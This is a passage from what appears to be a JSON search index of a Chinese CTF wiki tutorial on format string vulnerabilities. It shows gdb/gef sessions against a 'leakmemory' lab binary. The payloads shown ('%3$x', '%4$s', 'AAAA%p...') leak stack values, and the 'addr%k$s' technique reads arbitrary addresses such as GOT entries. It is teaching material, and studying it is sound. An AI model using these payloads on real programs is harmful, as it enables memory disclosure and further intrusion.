ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccfc ,  l8 ]  8 \n0xffffccfc\u2502+0x00: 0x080484ce  \u2192   main+99  add esp, 0x10     \u2190  $esp \n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192   %3 $x \n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192   %3 $x \n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192   handle_intel+107  add esp, 0x10\n0xffffcd10\u2502+0x14:  %3 $x      \u2190  $eax \n0xffffcd14\u2502+0x18: 0xffffce00  \u2192  0x00000001\n0xffffcd18\u2502+0x1c: 0x000000e0\ngef\u27a4  c\nContinuing.\nf7e8b6bb [ Inferior  1   ( process  57442 )  exited normally ]   \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u786e\u5b9e\u83b7\u5f97\u4e86printf\u7684\u7b2c4\u4e2a\u53c2\u6570\u6240\u5bf9\u5e94\u7684\u503cf7e8b6bb\u3002", 
            "title": "\u83b7\u53d6\u6808\u53d8\u91cf\u6570\u503c"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_6", 
            "text": "\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u5f97\u6808\u53d8\u91cf\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u9700\u8981\u7528\u5230%s\u4e86\u3002\u8fd9\u91cc\u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u8fdb\u884cgdb\u8c03\u8bd5\uff0c\u5982\u4e0b  \u279c  leakmemory git: ( master )  \u2717 gdb leakmemory\ngef\u27a4  b  printf \nBreakpoint  1  at 0x8048330\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n%s\n\nBreakpoint  1 , __printf  ( format = 0x8048563  %08x.%08x.%08x.%s\\n )  at printf.c:28 28   printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  code:i386  ] \u2500\u2500\u2500\u2500\n   0xf7e44667  fprintf+23      inc    DWORD PTR  [ ebx+0x66c31cc4 ] \n   0xf7e4466d                  nop\n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret\n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccec ,  l8 ]  8 \n0xffffccec\u2502+0x00: 0x080484bf  \u2192   main+84  add esp, 0x20     \u2190  $esp \n0xffffccf0\u2502+0x04: 0x08048563  \u2192   %08x.%08x.%08x.%s \n0xffffccf4\u2502+0x08: 0x00000001\n0xffffccf8\u2502+0x0c: 0x22222222\n0xffffccfc\u2502+0x10: 0xffffffff\n0xffffcd00\u2502+0x14: 0xffffcd10  \u2192  0xff007325  ( %s ? ) \n0xffffcd04\u2502+0x18: 0xffffcd10  \u2192  0xff007325  ( %s ? ) \n0xffffcd08\u2502+0x1c: 0x000000c2\ngef\u27a4  c\nContinuing. 00000001 .22222222.ffffffff.%s\n\nBreakpoint  1 , __printf  ( format = 0xffffcd10  %s )  at printf.c:28 28   in printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  code:i386  ] \u2500\u2500\u2500\u2500\n   0xf7e44667  fprintf+23      inc    DWORD PTR  [ ebx+0x66c31cc4 ] \n   0xf7e4466d                  nop\n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret\n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccfc ,  l8 ]  8 \n0xffffccfc\u2502+0x00: 0x080484ce  \u2192   main+99  add esp, 0x10     \u2190  $esp \n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192  0xff007325  ( %s ? ) \n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192  0xff007325  ( %s ? ) \n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192   handle_intel+107  add esp, 0x10\n0xffffcd10\u2502+0x14: 0xff007325  ( %s ? )      \u2190  $eax \n0xffffcd14\u2502+0x18: 0xffffce3c  \u2192  0xffffd074  \u2192   XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...] \n0xffffcd18\u2502+0x1c: 0x000000e0\ngef\u27a4  c\nContinuing.\n%s [ Inferior  1   ( process  57488 )  exited normally ]   \u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u7b2c\u4e8c\u6b21\u6267\u884cprintf\u51fd\u6570\u7684\u65f6\u5019\uff0c\u786e\u5b9e\u662f\u5c060xffffcd04\u5904\u7684\u53d8\u91cf\u89c6\u4e3a\u5b57\u7b26\u4e32\u53d8\u91cf\uff0c\u8f93\u51fa\u4e86\u5176\u6570\u503c\u6240\u5bf9\u5e94\u7684\u5730\u5740\u5904\u7684\u5b57\u7b26\u4e32\u3002  \u5f53\u7136\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u8fd9\u6837\u7684\u90fd\u4f1a\u6b63\u5e38\u8fd0\u884c\uff0c\u5982\u679c\u5bf9\u5e94\u7684\u53d8\u91cf\u4e0d\u80fd\u591f\u88ab\u89e3\u6790\u4e3a\u5b57\u7b26\u4e32\u5730\u5740\uff0c\u90a3\u4e48\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u76f4\u63a5\u5d29\u6e83\u3002  \u6b64\u5916\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u6307\u5b9a\u83b7\u53d6\u6808\u4e0a\u7b2c\u51e0\u4e2a\u53c2\u6570\u4f5c\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8f93\u51fa\uff0c\u6bd4\u5982\u6211\u4eec\u6307\u5b9a\u7b2cprintf\u7684\u7b2c3\u4e2a\u53c2\u6570\uff0c\u5982\u4e0b\uff0c\u6b64\u65f6\u7a0b\u5e8f\u5c31\u4e0d\u80fd\u591f\u89e3\u6790\uff0c\u5c31\u5d29\u6e83\u4e86\u3002  \u279c  leakmemory git: ( master )  \u2717 ./leakmemory\n%2 $s  00000001 .22222222.ffffffff.%2 $s  [ 1 ]      57534  segmentation fault  ( core dumped )   ./leakmemory  \u5c0f\u6280\u5de7\u603b\u7ed3    \u5229\u7528%x\u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528%p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\u3002  \u5229\u7528%s\u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\u3002  \u5229\u7528%order$x\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528%order$s\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u3002", 
            "title": "\u83b7\u53d6\u6808\u53d8\u91cf\u5bf9\u5e94\u5b57\u7b26\u4e32"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_7", 
            "text": "\u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u4e0a\u9762\u65e0\u8bba\u662f\u6cc4\u9732\u6808\u4e0a\u8fde\u7eed\u7684\u53d8\u91cf\uff0c\u8fd8\u662f\u8bf4\u6cc4\u9732\u6307\u5b9a\u7684\u53d8\u91cf\u503c\uff0c\u6211\u4eec\u90fd\u6ca1\u80fd\u5b8c\u5168\u63a7\u5236\u6211\u4eec\u6240\u8981\u6cc4\u9732\u7684\u53d8\u91cf\u7684\u5730\u5740\u3002\u8fd9\u6837\u7684\u6cc4\u9732\u56fa\u7136\u6709\u7528\uff0c\u53ef\u662f\u5374\u4e0d\u591f\u5f3a\u529b\u6709\u6548\u3002\u6709\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u60f3\u8981\u6cc4\u9732\u67d0\u4e00\u4e2alibc\u51fd\u6570\u7684got\u8868\u5185\u5bb9\uff0c\u4ece\u800c\u5f97\u5230\u5176\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\u7248\u672c\u4ee5\u53ca\u5176\u4ed6\u51fd\u6570\u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5019\uff0c\u80fd\u591f\u5b8c\u5168\u63a7\u5236\u6cc4\u9732\u67d0\u4e2a\u6307\u5b9a\u5730\u5740\u7684\u5185\u5b58\u5c31\u663e\u5f97\u5f88\u91cd\u8981\u4e86\u3002\u90a3\u4e48\u6211\u4eec\u7a76\u7adf\u80fd\u4e0d\u80fd\u8fd9\u6837\u505a\u5462\uff1f\u81ea\u7136\u4e5f\u662f\u53ef\u4ee5\u7684\u5566\u3002  \u6211\u4eec\u518d\u4ed4\u7ec6\u56de\u60f3\u4e00\u4e0b\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\uff0c\u6211\u4eec\u6240\u8bfb\u53d6\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5728\u6808\u4e0a\u7684\uff08\u56e0\u4e3a\u662f\u67d0\u4e2a\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u672c\u4f8b\u4e2ds\u662fmain\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\uff09\u3002\u90a3\u4e48\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u8c03\u7528\u8f93\u51fa\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u503c\u5176\u5b9e\u5c31\u662f\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u6211\u4eec\u9009\u62e9\u4e0a\u9762\u7684\u67d0\u4e2a\u51fd\u6570\u8c03\u7528\u4e3a\u4f8b  Breakpoint  1 , __printf  ( format = 0xffffcd10  %s )  at printf.c:28 28   in printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  code:i386  ] \u2500\u2500\u2500\u2500\n   0xf7e44667  fprintf+23      inc    DWORD PTR  [ ebx+0x66c31cc4 ] \n   0xf7e4466d                  nop\n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret\n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccfc ,  l8 ]  8 \n0xffffccfc\u2502+0x00: 0x080484ce  \u2192   main+99  add esp, 0x10     \u2190  $esp \n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192  0xff007325  ( %s ? ) \n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192  0xff007325  ( %s ? ) \n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192   handle_intel+107  add esp, 0x10\n0xffffcd10\u2502+0x14: 0xff007325  ( %s ? )      \u2190  $eax \n0xffffcd14\u2502+0x18: 0xffffce3c  \u2192  0xffffd074  \u2192   XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...] \n0xffffcd18\u2502+0x1c: 0x000000e0  \u53ef\u4ee5\u770b\u51fa\u5728\u6808\u4e0a\u7684\u7b2c\u4e8c\u4e2a\u53d8\u91cf\u5c31\u662f\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u57400xffffcd10\uff0c\u540c\u65f6\u8be5\u5730\u5740\u5b58\u50a8\u7684\u4e5f\u786e\u5b9e\u662f\u662f\"%s\"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5185\u5bb9\u3002  \u90a3\u4e48\u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u8f93\u51fa\u51fd\u6570\u8c03\u7528\u65f6\u662f\u7b2c\u51e0\u4e2a\u53c2\u6570\uff0c\u8fd9\u91cc\u5047\u8bbe\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f8\u5bf9\u51fd\u6570\u8c03\u7528\u4e3a\u7b2ck\u4e2a\u53c2\u6570\u3002\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u67d0\u4e2a\u6307\u5b9a\u5730\u5740addr\u7684\u5185\u5bb9\u3002  addr%k$s   \u6ce8\uff1a \u5728\u8fd9\u91cc\uff0c\u5982\u679c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u6808\u4e0a\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u4e00\u5b9a\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5bf9\u504f\u79fb\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u51fd\u6570\u8c03\u7528\u7684\u65f6\u5019\u6808\u6307\u9488\u81f3\u5c11\u4f4e\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u57408\u5b57\u8282\u6216\u800516\u5b57\u8282\u3002   \u4e0b\u9762\u5c31\u662f\u5982\u4f55\u786e\u5b9a\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e3a\u7b2c\u51e0\u4e2a\u53c2\u6570\u7684\u95ee\u9898\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u786e\u5b9a  [tag]%p%p%p%p%p%p...  \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u91cd\u590d\u67d0\u4e2a\u5b57\u7b26\u7684\u673a\u5668\u5b57\u957f\u6765\u4f5c\u4e3atag\uff0c\u800c\u540e\u9762\u4f1a\u8ddf\u4e0a\u82e5\u5e72\u4e2a%p\u6765\u8f93\u51fa\u6808\u4e0a\u7684\u5185\u5bb9\uff0c\u5982\u679c\u5185\u5bb9\u4e0e\u6211\u4eec\u524d\u9762\u7684tag\u91cd\u590d\u4e86\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6709\u5f88\u5927\u628a\u63e1\u8bf4\u660e\u8be5\u5730\u5740\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u4e4b\u6240\u4ee5\u8bf4\u662f\u6709\u5f88\u5927\u628a\u63e1\uff0c\u8fd9\u662f\u56e0\u4e3a\u4e0d\u6392\u9664\u6808\u4e0a\u6709\u4e00\u4e9b\u4e34\u65f6\u53d8\u91cf\u4e5f\u662f\u8be5\u6570\u503c\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6781\u5176\u5c11\u89c1\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u66f4\u6362\u5176\u4ed6\u5b57\u7b26\u8fdb\u884c\u5c1d\u8bd5\uff0c\u8fdb\u884c\u518d\u6b21\u786e\u8ba4\u3002\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u5b57\u7b26'A'\u4f5c\u4e3a\u7279\u5b9a\u5b57\u7b26\uff0c\u540c\u65f6\u8fd8\u662f\u5229\u7528\u4e4b\u524d\u7f16\u8bd1\u597d\u7684\u7a0b\u5e8f\uff0c\u5982\u4e0b  \u279c  leakmemory git: ( master )  \u2717 ./leakmemory\nAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p 00000001 .22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\nAAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7%  \u75310x41414141\u5904\u6240\u5728\u7684\u4f4d\u7f6e\u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u6b63\u597d\u662f\u8f93\u51fa\u51fd\u6570\u7684\u7b2c5\u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c4\u4e2a\u53c2\u6570\u3002\u6211\u4eec\u53ef\u4ee5\u6765\u6d4b\u8bd5\u4e00\u4e0b  \u279c  leakmemory git: ( master )  \u2717 ./leakmemory\n%4 $s  00000001 .22222222.ffffffff.%4 $s  [ 1 ]      61439  segmentation fault  ( core dumped )   ./leakmemory  \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7684\u7a0b\u5e8f\u5d29\u6e83\u4e86\uff0c\u4e3a\u4ec0\u4e48\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u8bd5\u56fe\u5c06\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u5bf9\u5e94\u7684\u503c\u4f5c\u4e3a\u5730\u5740\u8fdb\u884c\u89e3\u6790\uff0c\u4f46\u662f\u663e\u7136\u8be5\u503c\u6ca1\u6709\u529e\u6cd5\u4f5c\u4e3a\u4e00\u4e2a\u5408\u6cd5\u7684\u5730\u5740\u88ab\u89e3\u6790\uff0c\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u5d29\u6e83\u4e86\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u53c2\u8003\u4e0b\u9762\u7684\u8c03\u8bd5\u3002   \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret\n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffcd0c ,  l8 ]  8 \n0xffffcd0c\u2502+0x00: 0x080484ce  \u2192   main+99  add esp, 0x10     \u2190  $esp \n0xffffcd10\u2502+0x04: 0xffffcd20  \u2192   %4 $s \n0xffffcd14\u2502+0x08: 0xffffcd20  \u2192   %4 $s \n0xffffcd18\u2502+0x0c: 0x000000c2\n0xffffcd1c\u2502+0x10: 0xf7e8b6bb  \u2192   handle_intel+107  add esp, 0x10\n0xffffcd20\u2502+0x14:  %4 $s      \u2190  $eax \n0xffffcd24\u2502+0x18: 0xffffce00  \u2192  0x00000000\n0xffffcd28\u2502+0x1c: 0x000000e0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  trace  ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0xffffcd20  %4$s )  [ #1] 0x80484ce \u2192 Name: main() \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4   help  x/\nExamine memory: x/FMT ADDRESS.\nADDRESS is an expression  for  the memory address to examine.\nFMT is a repeat count followed by a format letter and a size letter.\nFormat letters are o ( octal ) , x ( hex ) , d ( decimal ) , u ( unsigned decimal ) ,\n  t ( binary ) , f ( float ) , a ( address ) , i ( instruction ) , c ( char ) , s ( string ) \n  and z ( hex, zero padded on the left ) .\nSize letters are b ( byte ) , h ( halfword ) , w ( word ) , g ( giant,  8  bytes ) .\nThe specified number of objects of the specified size are printed\naccording to the format.\n\nDefaults  for  format and size letters are those previously used.\nDefault count is  1 .  Default address is following last thing printed\nwith this  command  or  print .\ngef\u27a4  x/x 0xffffcd20\n0xffffcd20: 0x73243425\ngef\u27a4  vmmap\nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n0x08049000 0x0804a000 0x00000000 r-- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n0x0804a000 0x0804b000 0x00001000 rw- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n0x0804b000 0x0806c000 0x00000000 rw-  [ heap ] \n0xf7dfb000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fab000 0xf7fad000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fad000 0xf7fae000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fae000 0xf7fb1000 0x00000000 rw-\n0xf7fd3000 0xf7fd5000 0x00000000 rw-\n0xf7fd5000 0xf7fd7000 0x00000000 r--  [ vvar ] \n0xf7fd7000 0xf7fd9000 0x00000000 r-x  [ vdso ] \n0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffb000 0xf7ffc000 0x00000000 rw-\n0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so\n0xffedd000 0xffffe000 0x00000000 rw-  [ stack ] \ngef\u27a4  x/x 0x73243425\n0x73243425: Cannot access memory at address 0x73243425  \u663e\u71360xffffcd20\u5904\u6240\u5bf9\u5e94\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u5bf9\u5e94\u7684\u53d8\u91cf\u503c0x73243425\u5e76\u4e0d\u80fd\u591f\u88ab\u6539\u7a0b\u5e8f\u8bbf\u95ee\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u81ea\u7136\u5d29\u6e83\u4e86\u3002  \u90a3\u4e48\u5982\u679c\u6211\u4eec\u8bbe\u7f6e\u4e00\u4e2a\u53ef\u8bbf\u95ee\u7684\u5730\u5740\u5462\uff1f\u6bd4\u5982\u8bf4scanf@got\uff0c\u7ed3\u679c\u4f1a\u600e\u4e48\u6837\u5462\uff1f\u5e94\u8be5\u81ea\u7136\u662f\u8f93\u51fascanf\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u6211\u4eec\u4e0d\u59a8\u6765\u8bd5\u4e00\u4e0b\u3002  \u9996\u5148\uff0c\u83b7\u53d6scanf@got\u7684\u5730\u5740\uff0c\u5982\u4e0b   \u8fd9\u91cc\u4e4b\u6240\u4ee5\u6ca1\u6709\u4f7f\u7528printf\u51fd\u6570\uff0c\u662f\u56e0\u4e3ascanf\u51fd\u6570\u4f1a\u5bf90a\uff0c0b\uff0c0c\uff0c00\u7b49\u5b57\u7b26\u6709\u4e00\u4e9b\u5947\u602a\u7684\u5904\u7406\uff0c\uff0c\u5bfc\u81f4\u65e0\u6cd5\u6b63\u5e38\u8bfb\u5165\uff0c\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u8bd5\u8bd5\u3002\u3002\u3002\u3002   gef\u27a4  got\n\n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\uff1a     \u6587\u4ef6\u683c\u5f0f elf32-i386\n\nDYNAMIC RELOCATION RECORDS\nOFFSET   TYPE              VALUE\n08049ffc R_386_GLOB_DAT    __gmon_start__\n0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0\n0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0\n0804a014 R_386_JUMP_SLOT   